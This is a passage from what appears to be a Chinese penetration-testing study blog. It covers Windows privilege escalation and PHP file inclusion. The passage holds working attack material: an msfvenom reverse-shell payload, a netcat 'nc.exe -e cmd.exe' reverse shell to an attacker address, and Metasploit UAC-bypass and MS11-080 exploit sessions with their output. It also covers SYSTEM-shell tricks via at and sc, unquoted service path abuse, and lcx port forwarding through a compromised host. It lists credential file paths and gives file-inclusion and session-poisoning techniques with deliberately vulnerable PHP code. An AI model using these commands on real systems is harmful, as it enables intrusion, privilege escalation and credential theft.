替换粘贴键</code></pre><p><strong>沙盒执行命令</strong></p><p>openrowset开启</p><p>openrowset关闭</p><p>沙盒执行命令</p><p><strong>注册表篡改</strong></p><p>注册表劫持粘贴键</p><h4 id="系统配置不当提权"><a href="#系统配置不当提权" class="headerlink" title="系统配置不当提权"></a>系统配置不当提权</h4><p>利用配置不当提权</p><ul><li>前提：已经成功渗透进目标系统；</li><li>相比利用漏洞提权，是更常用的方法；</li><li>在大部分企业中，会将系统的漏洞即时进行补丁更新，难以通过系统自身我的漏洞进行入侵；</li><li>可以查找系统中以system权限启动的服务或应用，可以尝试将其替换或者反弹shell的方式提权；</li><li>可以查找NTFS权限允许users修改删除的应用，利用配置不当进行提权；</li><li>代码中是否有过滤参数的操作等都可以加以利用，进行提取</li></ul><h4 id="权限继承类提权"><a href="#权限继承类提权" class="headerlink" title="权限继承类提权"></a>权限继承类提权</h4><p><strong>开机启动项提权？</strong><br>windows开机时候都会有一些开机启动的程序，那时候启动的程序权限都是system，因为是system把他们启动的，利用这点，我们可以将自动化脚本写入启动项，达到提权的目的。</p><h4 id="第三方软件-服务提权"><a href="#第三方软件-服务提权" class="headerlink" title="第三方软件/服务提权"></a>第三方软件/服务提权</h4><h4 id="WebServer漏洞提权"><a href="#WebServer漏洞提权" class="headerlink" title="WebServer漏洞提权"></a>WebServer漏洞提权</h4><h4 id="提权中常见的问题"><a href="#提权中常见的问题" class="headerlink" title="提权中常见的问题"></a>提权中常见的问题</h4><p>cmd无法执行</p><ul><li><p>cmd被删除</p><ul><li>绕过思路：找可读可写目录，上传cmd.exe</li></ul></li><li><p>cmd被降权</p><ul><li>绕过思路：找可读可写目录，上传cmd.exe</li></ul></li><li><p>组件被删除</p><ul><li>切换组件</li></ul></li><li><p>防护软件拦截</p><ul><li>很难绕过</li></ul></li><li><p>3389无法连接</p></li><li><p>端口被修改</p><ul><li>找端口（1-65535），使用端口扫描工具、注册表读取、查询PID</li></ul></li><li><p>端口被关闭</p><ul><li>上传3389打开工具到可读可写目录，需要先提权，调用执行exe工具</li></ul></li><li><p>内网环境</p><ul><li>端口转发：<ol><li>外网服务器：lcx.exe -listen 1234 4321 (监听1234端口的流量并将其转发至本地4321端口)</li><li>内网肉鸡：lcx.exe -slave 121.43.99.73 1234 192.168.1.106 1111 (将本地192.168.1.106的1111端口流量转发至121.43.99.73的1234端口上)</li><li>外网 连接本地端口4321 即代表连接肉鸡的1111端口</li></ol></li></ul></li><li><p>防护软件拦截</p><ul><li>很困难</li></ul></li></ul><h3 id="提权辅助工具"><a href="#提权辅助工具" class="headerlink" title="提权辅助工具"></a>提权辅助工具</h3><h5 id="1-Linux提权辅助工具"><a href="#1-Linux提权辅助工具" class="headerlink" title="1.Linux提权辅助工具"></a>1.Linux提权辅助工具</h5><p>Linux_Exploit_Suggester是一款根据操作系统版本号自动查找相应提权脚本的工具，如果不带任何参数运行该脚本的话，将执行uname -r返回的操作系统发行版本，或者手工输入-k参数查找指定版本号。</p><p>github项目地址：</p><pre><code>https://github.com/InteliSecureLabs/Linux_Exploit_Suggester</code></pre><p> 用法示例：</p><pre><code>$ perl ./Linux_Exploit_Suggester.pl -k 2.6.28</code></pre><h5 id="2-Windows提权辅助工具"><a href="#2-Windows提权辅助工具" class="headerlink" title="2.Windows提权辅助工具"></a>2.Windows提权辅助工具</h5><p>Windows-Exploit-Suggester是受Linux_Exploit_Suggester的启发而开发的一款提权辅助工具，用python开发而成，通过比对systeminfo生成的文件，从而发现系统是否存在未修复漏洞。</p><p>github项目地址：</p><pre><code>https://github.com/AonCyberLabs/Windows-Exploit-Suggester</code></pre><p>用法示例：</p><pre><code>#查看系统可能存在的漏洞$ ./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt $ ./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --ostext &#39;windows server 2008 r2&#39;</code></pre><h5 id="3-gfto"><a href="#3-gfto" class="headerlink" title="3.gfto"></a>3.gfto</h5><p>gtfo是一个纯粹用python3编写的工具，用于搜索GTFOBins和LOLBAS上的二进制文件。</p><p>github项目地址： </p><pre><code>https://github.com/mzfr/gtfo</code></pre><p>很明显，从以上描述里，我们知道这款工具并不是主角，需要重点关注的是GTFOBins和LOLBAS。</p><p>GTFOBins：Linux命令提权辅助查询.</p><h5 id="4-Beroot"><a href="#4-Beroot" class="headerlink" title="4.Beroot"></a>4.Beroot</h5><p>BeRoot Project是一个利用后的工具，可以检查常见的错误配置，以找到提升我们特权的方法，该项目可在Windows，Linux和Mac OS上运行。</p><p>github项目地址：</p><pre><code>https://github.com/AlessandroZ/BeRoot</code></pre><h5 id="5-Vulmap"><a href="#5-Vulmap" class="headerlink" title="5.Vulmap"></a>5.Vulmap</h5><p>Vulmap是一个开源的在线本地漏洞扫描程序项目。它由适用于Windows和Linux操作系统的联机本地漏洞扫描程序组成。</p><p>Github项目地址：</p><pre><code>https://github.com/vulmon/Vulmap</code></pre><h5 id="6-WindowsVulnScan"><a href="#6-WindowsVulnScan" class="headerlink" title="6.WindowsVulnScan"></a>6.WindowsVulnScan</h5><p>这是一款基于主机的漏洞扫描工具，查看查找主机上具有的CVE和具有公开EXP的CVE。</p><p>github项目地址：</p><pre><code>https://github.com/chroblert/WindowsVulnScan</code></pre><h5 id="7、ATRoot-Auxiliary-v2-0"><a href="#7、ATRoot-Auxiliary-v2-0" class="headerlink" title="7、ATRoot Auxiliary v2.0"></a>7、ATRoot Auxiliary v2.0</h5><p>基于java开发的提权辅助工具，支持双端加载，本地模式配置文件存放于本地软件目录下的conf目录；远程模式则可以更新配置文件</p><h5 id="8、在线提权漏洞检测平台"><a href="#8、在线提权漏洞检测平台" class="headerlink" title="8、在线提权漏洞检测平台"></a>8、在线提权漏洞检测平台</h5><p>一款为主流 Linux/Unix 和 Windows 系统提供精准且高效的操作系统脆弱性漏洞检测的专业化平台，基于其强大的安全检测能力，能够给出专业的修复建议，有效验证和加固网络资产漏洞。</p><p>在线查询地址：</p><pre><code>https://detect.secwx.com/</code></pre><h5 id="9-提权辅助网页"><a href="#9-提权辅助网页" class="headerlink" title="9.提权辅助网页"></a>9.提权辅助网页</h5><p>在Windows提权的时候，对比补丁找Exp很烦吧？老是忘记一些提权命令跟工具的语法很苦逼吧？没事，有了这款工具什么问题都解决~</p><p>在线查询地址：</p><pre><code>http://bugs.hacking8.com/tiquan/</code></pre><h3 id="window提权的常见方式："><a href="#window提权的常见方式：" class="headerlink" title="window提权的常见方式："></a>window提权的常见方式：</h3><h5 id="window下的用户权限："><a href="#window下的用户权限：" class="headerlink" title="window下的用户权限："></a>window下的用户权限：</h5><ul><li>user</li><li>administrator</li><li>system</li></ul><h5 id="一些常见命令"><a href="#一些常见命令" class="headerlink" title="一些常见命令"></a>一些常见命令</h5><pre><code>systeminfo | findstr OS #获取系统版本信息hostname    #获取主机名称whomai /priv    #显示当前用户的安全特权quser or query user    #获取在线用户netstat -ano | findstr 3389    #获取rdp连接来源IPdir c:\programdata\ #分析安装杀软wmic qfe get Caption,Description,HotFixID,InstalledOn    #列出已安装的补丁REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp /v PortNumber    #获取远程端口tasklist /svc | find &quot;TermService&quot; + netstat -ano    #获取远程端口</code></pre><h5 id="window-2003-xp"><a href="#window-2003-xp" class="headerlink" title="window 2003 xp"></a>window 2003 xp</h5><p>现在03的机器已经很少了，所以现在只是简单的说一些常见的思路，操作，第三方之类的除外</p><p>实验环境：</p><p>windows 2003：192.168.0.105</p><p>kali ： 192.168.0.107</p><p>首先生成个木马：</p><pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.107 LPORT=4444 -f exe -o payload.exe</code></pre><p>如果有waf，生成的木马文件会被删除，可以使用veil生成免杀马，当然如果只是为了反弹shell，也可以上传一个nc.exe，在目标服务器上执行nc正向连接：</p><pre><code>nc.exe -e cmd.exe 192.168.0.107 4444</code></pre><p>nc shell反弹成功后：</p><p><img src="https://img2018.cnblogs.com/blog/1344396/201905/1344396-20190522154018196-1241701420.png" alt="img"></p><p>msf shell反弹成功后，查看当前权限</p><p><img src="https://img2018.cnblogs.com/blog/1344396/201905/1344396-20190522153318096-1634466475.jpg" alt="img"></p><p>windows2003 可以直接 getsystem提权</p><p><img src="https://img2018.cnblogs.com/blog/1344396/201905/1344396-20190522154110280-1290361076.jpg" alt="img"></p><p>提权失败，一般可能是uac的问题，尝试bypass uac</p><ul><li>use exploit/windows/local/ask</li></ul><pre><code>msf5 exploit(multi/handler) &gt; use exploit/windows/local/askmsf5 exploit(windows/local/ask) &gt; show options Module options (exploit/windows/local/ask):   Name       Current Setting  Required  Description   ----       ---------------  --------  -----------   FILENAME                    no        File name on disk   PATH                        no        Location on disk, %TEMP% used if not set   SESSION                     yes       The session to run this module on.   TECHNIQUE  EXE              yes       Technique to use (Accepted: PSH, EXE)Exploit target:   Id  Name   --  ----   0   Windowsmsf5 exploit(windows/local/ask) &gt; set SESSION 2SESSION =&gt; 2msf5 exploit(windows/local/ask) &gt; set TECHNIQUE up.exe[-] The following options failed to validate: Value &#39;up.exe&#39; is not valid for option &#39;TECHNIQUE&#39;.TECHNIQUE =&gt; EXEmsf5 exploit(windows/local/ask) &gt; set TECHNIQUE EXETECHNIQUE =&gt; EXEmsf5 exploit(windows/local/ask) &gt; set payload windows/meterpreter/reverse_tcppayload =&gt; windows/meterpreter/reverse_tcpmsf5 exploit(windows/local/ask) &gt; set lhost 192.168.0.107lhost =&gt; 192.168.0.107msf5 exploit(windows/local/ask) &gt; show options Module options (exploit/windows/local/ask):   Name       Current Setting  Required  Description   ----       ---------------  --------  -----------   FILENAME                    no        File name on disk   PATH                        no        Location on disk, %TEMP% used if not set   SESSION    2                yes       The session to run this module on.   TECHNIQUE  EXE              yes       Technique to use (Accepted: PSH, EXE)Payload options (windows/meterpreter/reverse_tcp):   Name      Current Setting  Required  Description   ----      ---------------  --------  -----------   EXITFUNC  process          yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)   LHOST     192.168.0.107    yes       The listen address (an interface may be specified)   LPORT     4444             yes       The listen portExploit target:   Id  Name   --  ----   0   Windowsmsf5 exploit(windows/local/ask) &gt; sessions -iActive sessions===============  Id  Name  Type                     Information                                 Connection  --  ----  ----                     -----------                                 ----------  1         meterpreter x86/windows  SERVER-816F6090\xiaoming @ SERVER-816F6090  192.168.0.107:4444 -&gt; 192.168.0.105:1032 (192.168.0.105)  2         meterpreter x86/windows  SERVER-816F6090\xiaoming @ SERVER-816F6090  192.168.0.107:4444 -&gt; 192.168.0.105:1033 (192.168.0.105)msf5 exploit(windows/local/ask) &gt; exploit [*] Started reverse TCP handler on 192.168.0.107:4444 [+] UAC is not enabled, no prompt for the user[*] Uploading VerOkoVbPk.exe - 73802 bytes to the filesystem...[*] Executing Command!</code></pre><p>或者：</p><ul><li>use exploit/windows/local/bypassuac</li><li>use exploit/windows/local/bypassuac_injection</li></ul><p>使用漏洞提权</p><pre><code>meterpreter &gt; run post/windows/gather/enum_patches[+] KB2871997 is missing[+] KB2928120 is missing[+] KB977165 - Possibly vulnerable to MS10-015 kitrap0d if Windows 2K SP4 - Windows 7 (x86)[+] KB2305420 - Possibly vulnerable to MS10-092 schelevator if Vista, 7, and 2008[+] KB2592799 - Possibly vulnerable to MS11-080 afdjoinleaf if XP SP2/SP3 Win 2k3 SP2[+] KB2778930 - Possibly vulnerable to MS13-005 hwnd_broadcast, elevates from Low to Medium integrity[+] KB2850851 - Possibly vulnerable to MS13-053 schlamperei if x86 Win7 SP0/SP1[+] KB2870008 - Possibly vulnerable to MS13-081 track_popup_menu if x86 Windows 7 SP0/SP1</code></pre><p>以ms11-080为例</p><pre><code>msf5 &gt; use exploit/windows/local/ms11_080_afdjoinleaf msf5 exploit(windows/local/ms11_080_afdjoinleaf) &gt; show options Module options (exploit/windows/local/ms11_080_afdjoinleaf):   Name     Current Setting  Required  Description   ----     ---------------  --------  -----------   SESSION                   yes       The session to run this module on.Exploit target:   Id  Name   --  ----   0   Automaticmsf5 exploit(windows/local/ms11_080_afdjoinleaf) &gt; set SESSION 2SESSION =&gt; 2msf5 exploit(windows/local/ms11_080_afdjoinleaf) &gt; run[*] Started reverse TCP handler on 192.168.0.107:4444 [*] Running against Windows Server 2003 SP2[*] HaliQuerySystemInformation Address: 0x80a6ba1e[*] HalpSetSystemInformation Address: 0x80a6dc60[*] Triggering AFDJoinLeaf pointer overwrite...[*] Injecting the payload into SYSTEM process: winlogon.exe[*] Sending stage (179779 bytes) to 192.168.0.105[*] Restoring the original token...[*] Meterpreter session 3 opened (192.168.0.107:4444 -&gt; 192.168.0.105:1035) at 2019-05-13 21:26:33 +0800meterpreter &gt; getuid Server username: NT AUTHORITY\SYSTEM</code></pre><p>提权成功：</p><p><img src="https://img2018.cnblogs.com/blog/1344396/201905/1344396-20190522154443677-990970002.jpg" alt="img"></p><h4 id="at命令提权"><a href="#at命令提权" class="headerlink" title="at命令提权"></a>at命令提权</h4><p>在 Windows2000、Windows 2003、Windows XP 这三类系统中，我们可以轻松将Administrators 组下的用户权限提升到 SYSTEM</p><p>at 是一个发布定时任务计划的命令行工具，语法比较简单。通过 at 命令发布的定时任务计划， Windows 默认以 SYSTEM 权限运行。定时任务计划可以是批处理、</p><p>可以是一个二进制文件。</p><pre><code>语法：at 时间 命令例子：at 10:45PM calc.exe</code></pre><p>该命令会发布一个定时任务计划，在每日的 10:45 启动 calc.exe。</p><p>我们可以通过 “/interactive”开启界面交互模式：</p><pre><code>at 10:45PM /interactive calc.exe </code></pre><p><img src="https://img2018.cnblogs.com/blog/1344396/201905/1344396-20190522154647644-1514865506.jpg" alt="img"></p><p>在得到一个system的cmd之后，使用taskmgr命令调用任务管理器，此时的任务管理器是system权限，然后kill掉explore进程，再使用任务管理器新建explore进程，将会得到一个system的桌面环境。</p><p><img src="https://img2018.cnblogs.com/blog/1344396/201905/1344396-20190522154816521-2015900158.jpg" alt="img"></p><h4 id="at配合msf提权"><a href="#at配合msf提权" class="headerlink" title="at配合msf提权"></a>at配合msf提权</h4><p>可以采用 Regsvr32 一条命令上线</p><p>msf下配置</p><p><img src="https://img2018.cnblogs.com/blog/1344396/201905/1344396-20190522155002108-1416348832.jpg" alt="img"></p><p>cmd下执行</p><p><img src="https://img2018.cnblogs.com/blog/1344396/201905/1344396-20190522155024645-120375889.jpg" alt="img"></p><p>等待上线</p><p>可是这里一般会出现问题..</p><p><img src="https://img2018.cnblogs.com/blog/1344396/201905/1344396-20190522155114408-603066182.jpg" alt="img"></p><p>后我们也可以选择上线木马的方式来获取shell</p><p>等待上线</p><p><img src="https://img2018.cnblogs.com/blog/1344396/201905/1344396-20190522155209993-1691279994.jpg" alt="img"></p><p>上线后为system</p><p><img src="https://img2018.cnblogs.com/blog/1344396/201905/1344396-20190522155237335-632224558.jpg" alt="img"></p><h4 id="windows7、8、12、16"><a href="#windows7、8、12、16" class="headerlink" title="windows7、8、12、16"></a>windows7、8、12、16</h4><h5 id="SC命令提权"><a href="#SC命令提权" class="headerlink" title="SC命令提权"></a>SC命令提权</h5><p>经测试03也可以</p><p>关于sc命令：</p><pre><code>SC 是用于与服务控制管理器和服务进行通信的命令行程序。提供的功能类似于“控制面板”中“管理工具”项中的“服务”。</code></pre><p>创建一个名叫syscmd的新的交互式的cmd服务:</p><pre><code>SC Create syscmd binPath= &quot;cmd /K start&quot; type= own type= interact</code></pre><p>然后执行：</p><pre><code>sc start systcmd</code></pre><p>就得到了一个system权限的cmd环境</p><p><img src="https://img2018.cnblogs.com/blog/1344396/201905/1344396-20190522155851751-1387514150.jpg" alt="img"></p><h4 id="通过不带引号的服务路径"><a href="#通过不带引号的服务路径" class="headerlink" title="通过不带引号的服务路径"></a>通过不带引号的服务路径</h4><p>当系统管理员配置Windows服务时，他们必须指定要执行的命令，或者运行可执行文件的路径。</p><p>当Windows服务运行时，会发生以下两种情况之一。如果给出了可执行文件，并且引用了完整路径，则系统会按字面解释它并执行。但是，如果服务的二进制路径未包含在引号中，则操作系统将会执行找到的空格分隔的服务路径的第一个实例。</p><p>这可能有点不直观，所以让我们来看一个实际的例子。假设服务配置类似于以下存在bug的示例服务：</p><p><img src="https://img2018.cnblogs.com/blog/1344396/201905/1344396-20190522161040219-164078702.jpg" alt="img"></p><p>Windows命令解释程序可能会遇到名称中的空格，并且希望通过将字符串包装在引号中来对它们进行转义。在上面的示例中，如果系统运行该服务，它将尝试运行以下可执行文件：</p><pre><code>C:\Program.exeC:\Program Files\Vulnerable.exeC:\Program Files\Vulnerable Service\Sub.exeC:\Program Files\Vulnerable Service\Sub Directory\service.exe</code></pre><p>所以如果我们能够上传一个适当命名的恶意可执行程序在受影响的目录，服务一旦重启，我们的恶意程序就会以system权限运行(大多数情况下)。</p><p>我们可以使用以下命令查看错误配置的路径</p><pre><code>wmic service get name,displayname,pathname,startmode |findstr /i &quot;Auto&quot; |findstr /i /v &quot;C:\Windows\\&quot; |findstr /i /v &quot;&quot;&quot;</code></pre><p><img src="https://img2018.cnblogs.com/blog/1344396/201905/1344396-20190522161224135-116677485.jpg" alt="img"></p><p>这里我们枚举出下列路径：</p><pre><code>C:\Program Files (x86)\Cisco\Cisco HostScan\bin\ciscod.exe</code></pre><p>个路径没有被双引号包裹，而且文件名中也存在空格。</p><p>现在，我们需要使用下列命令识别文件目录权限，判断是否有写入权限：</p><pre><code>icacls C:\Program Files (x86)\Cisco</code></pre><p>M)代表修改权限，(F)代表完全控制，(CI)代表从属容器将继承访问控制项，(OI)代表从属文件将继承访问控制项。</p><p>如果它给任何人提供了写入权限，这也就意味着任何用户都可以重写该文件</p><p>将我们需要执行的exe根据需要重命名并放置在可写入的有漏洞目录下，然后运行如下命令尝试重启服务，如果失败的话等待服务器重启时执行exe，成功提权后记得清理痕迹。</p><p><img src="https://img2018.cnblogs.com/blog/1344396/201905/1344396-20190522161926904-1449078879.jpg" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 提权方式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含漏洞学习笔记</title>
      <link href="/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/"/>
      <url>/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/</url>
      
        <content type="html"><![CDATA[<h2 id="文件包含漏洞学习"><a href="#文件包含漏洞学习" class="headerlink" title="文件包含漏洞学习"></a>文件包含漏洞学习</h2><h4 id="文件包含漏洞相关知识点"><a href="#文件包含漏洞相关知识点" class="headerlink" title="文件包含漏洞相关知识点"></a>文件包含漏洞相关知识点</h4><h5 id="什么是文件包含？"><a href="#什么是文件包含？" class="headerlink" title="什么是文件包含？"></a>什么是文件包含？</h5><p>​       服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP执行，这会为开发者节省大量的时间。这意味着您可以创建供所有网页引用的标准页眉或菜单文件。当页眉需要更新时，您只更新一个包含文件就可以了，或者当您向网站添加一张新页面时，仅仅需要修改一下菜单文件（而不是更新所有网页中的链接）。</p><h5 id="文件包含函数"><a href="#文件包含函数" class="headerlink" title="文件包含函数"></a>文件包含函数</h5><ul><li>require()</li><li>require_once()</li><li>include()</li><li>include_once()</li></ul><p><strong><code>include</code>和<code>require</code>区别</strong>:<code>include</code>在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而<code>require</code>函数出现错误的时候，会直接报错并退出程序的执行。</p><p>而<code>include_once()</code>，<code>require_once()</code>这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。</p><p><img src="D:%5C%E5%9B%BE%E7%89%87%5C9272355-7889a572371b18c8.png" alt=""></p><h5 id="漏洞产生的原因"><a href="#漏洞产生的原因" class="headerlink" title="漏洞产生的原因"></a>漏洞产生的原因</h5><p>文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致执行了非预期的代码。</p><p>示例代码：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>       <span class="token variable">$filename</span><span class="token operator">=</span><span class="token variable">$GET</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>       <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><code>$_GET[&#39;filename&#39;]</code>参数开发者没有经过严格的过滤，直接带入了include的函数，攻击者可以修改<code>$_GET[&#39;filename&#39;]</code>的值，执行非预期的操作。</p><h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><p>文件包含分为：本地(LFI)/远程(RFI)包含</p><p>本地文件包含漏洞，顾名思义，指的是能打开并包含本地文件的漏洞。大部分情况下遇到的文件包含漏洞都是LFI。简单的测试用例如前所示。</p><p>远程文件包含漏洞。是指能够包含远程服务器上的文件并执行。由于远程服务器的文件是我们可控的，因此漏洞一旦存在危害性会很大。<br> 但RFI的利用条件较为苛刻，需要php.ini中进行配置</p><pre class=" language-undefined"><code class="language-undefined">allow_url_fopen = Onallow_url_include = On，重启apache，即可生效</code></pre><p>两个配置选项均需要为On，才能远程包含文件成功。<br> 另外一台需要开启apache</p><pre class=" language-kotlin"><code class="language-kotlin">apt<span class="token operator">-</span><span class="token keyword">get</span> install apache2 <span class="token operator">/</span>etc<span class="token operator">/</span><span class="token keyword">init</span><span class="token punctuation">.</span>d<span class="token operator">/</span>apache2 start</code></pre><p><img src="https://upload-images.jianshu.io/upload_images/9272355-952116d80dc7f768.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200" alt="img"></p><p>1.png</p><p><img src="https://upload-images.jianshu.io/upload_images/9272355-e288840e08e52b5e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/376" alt="img"></p><p>2.png<br> 注：在php.ini中，allow_url_fopen默认一直是On，而<code>allow_url_include</code>从php5.2之后就默认为Off。<br> 下面例子中测试代码均为：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">include</span> <span class="token variable">$file</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>allow_url_fopen 默认为 On<br> allow_url_include 默认为 Off<br> 若有特殊要求，会在利用条件里指出。</p><h4 id="本地文件包含漏洞"><a href="#本地文件包含漏洞" class="headerlink" title="本地文件包含漏洞"></a>本地文件包含漏洞</h4><h5 id="一、无限制本地文件包含漏洞"><a href="#一、无限制本地文件包含漏洞" class="headerlink" title="一、无限制本地文件包含漏洞"></a>一、无限制本地文件包含漏洞</h5><p><strong>测试代码：</strong></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token variable">$filename</span> <span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><strong>常见的敏感信息目录：</strong></p><p>window系统：</p><ul><li>c:\boot.ini //查看系统版本</li><li>c:\windows\system32\inetsrv\MetaBase.xml //IIS配置</li><li>c:\windows\repair\sam  // 存储Windows系统初次安装的密码</li><li>c:\ProgramFiles\mysql\my.ini // MySQL配置</li><li>c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码</li><li>c:\windows\php.ini // php 配置信息</li></ul><p>Linux系统</p><ul><li>/etc/passwd // 账户信息</li><li>/etc/shadow // 账户密码文件</li><li>/usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件</li><li>/etc/my.conf // mysql 配置文件</li></ul><h5 id="二、session文件包含漏洞"><a href="#二、session文件包含漏洞" class="headerlink" title="二、session文件包含漏洞"></a>二、session文件包含漏洞</h5><p><strong>利用条件</strong></p><p>1.我们可以通过phpinfo的信息泄露获取到session的存储位置</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200123104312.png" alt=""></p><p>2.或者通过猜测默认的session存放位置</p><p>linux下的默认存储目录为/var/lib/php/session</p><p><strong>利用过程</strong></p><p>我们可以先使用文件包含上传恶意代码，比如</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ctfs</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'ctfs'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$ctfs</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>此php会将获取到的GET型ctfs变量的值存入到session中。如果存在本地文件包含漏洞，就可以通过ctfs写入恶意代码到session文件中，然后通过文件包含漏洞执行此恶意代码。<br>我们构造：</p><img src="QQ截图20200123104221.png" style="zoom:80%;" /><p>我们发现在本地session所在目录下存储了session的值</p><img src="QQ截图20200123105708.png" style="zoom:80%;" /><p>攻击者通过phpinfo()信息泄露或者猜测获取到session存放的目录位置，然后通过浏览器自带开发者模式获取到文件名称：sess_lotipf7ccidsbsrltdau35rb65</p><img src="QQ截图20200123103711.png" style="zoom:150%;" /><p>构造本地文件包含 ：<strong>file.php?D:\phpStudy\PHPTutorial\tmp\tmp\sess_lotipf7ccidsbsrltdau35rb65</strong></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200123104500.png" alt=""></p><h5 id="三、有限制本地文件包含漏洞绕过"><a href="#三、有限制本地文件包含漏洞绕过" class="headerlink" title="三、有限制本地文件包含漏洞绕过"></a>三、有限制本地文件包含漏洞绕过</h5><p><strong>%00截断</strong></p><p>条件：magic_quotes_gpc=Off  并且php版本&lt;5.3.4</p><p><strong>测试代码</strong></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token variable">$filename</span>  <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span> <span class="token punctuation">.</span> <span class="token string">".html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>当我们直接包含本地的test.txt时</p><img src="QQ截图20200123113838.png" style="zoom:67%;" /><p>我们在test.txt加上%00进行截断</p><img src="QQ截图20200123113851.png" style="zoom:67%;" /><p><strong>四、路径长度限制</strong></p><p>条件：windows OS,点号需要长于256；linuxOS 长于4096</p><pre><code>windows下目录最大长度为256字节，超出的部分会被丢弃；linux下目录最大长度为4096字节，超出的部分会被丢弃。</code></pre><p>测试代码：</p><pre><code>&lt;?php   $filename =$_GET[&#39;filename&#39;];   include($filename . &quot;.html&quot;);   ?&gt;</code></pre><h4 id="远程文件包含漏洞"><a href="#远程文件包含漏洞" class="headerlink" title="远程文件包含漏洞"></a>远程文件包含漏洞</h4><p>PHP的配置文件allow_url_fopen和allow_url_include设置为ON，include/require等包含函数可以加载远程文件，如果远程文件没经过严格的过滤，导致了执行恶意文件的代码，这就是远程文件包含漏洞。</p><pre><code>allow_url_fopen = On（是否允许打开远程文件）allow_url_include = On（是否允许include/require远程文件）</code></pre><p>示例：</p><p>测试代码：</p><pre><code>&lt;?php    $filename  = $_GET[&#39;filename&#39;];    include($filename);?&gt;</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200203191630.png" alt=""></p><h4 id="PHP伪协议在文件包含中的应用"><a href="#PHP伪协议在文件包含中的应用" class="headerlink" title="PHP伪协议在文件包含中的应用"></a>PHP伪协议在文件包含中的应用</h4><p>PHP带有很多内置URL风格的封装协议，可用于类似fopen()、copy()、file_exists()和filesize()的文件系统函数。除了这些封装协议、还能通过stream_wrapper_register() 来注册自定义的封装协议。</p><p><strong>php伪协议类别</strong></p><ul><li>file://    访问本地文件系统</li><li>http://   访问HTTP（s)网址</li><li>ftp://     访问FTP(s) URLs</li><li>php://      访问各个输入/输出流</li><li>zlib://     压缩流</li><li>data://  数据</li></ul><p><strong>php://filter(本地磁盘文件进行读取）</strong></p><p>元封装器，设计用于“数据流打开“时的”筛选过滤“应用，对本地磁盘文件进行读写。</p><p>用法：?filename=php://filter/convert.base64-encode/resource=xxx.php</p><p>条件：需要开启allow_url_fopen</p><p>示例：</p><p>本地新建file.php</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200128205700.png" alt=""></p><p>我们使用php伪协议在本地读取shell.php文件中的内容</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200128205953.png" alt=""></p><p>对得到的Base64进行解码即可。</p><p><strong>file://伪协议（读取文件内容）</strong></p><p>通过file协议可以访问本地文件系统，读取到文件的内容</p><p>示例：</p><img src="QQ截图20200203184038.png" style="zoom:67%;" /><h5 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h5><p>可以访问请求的原始数据的只读流。即可以直接读取到POST上没有经过解析的原始数据。 enctype=”multipart/form-data” 的时候 php://input 是无效的。</p><p>用法：?file=php://input 数据利用POST传过去。</p><p>利用条件：</p><p>allow_url_include = On。<br> 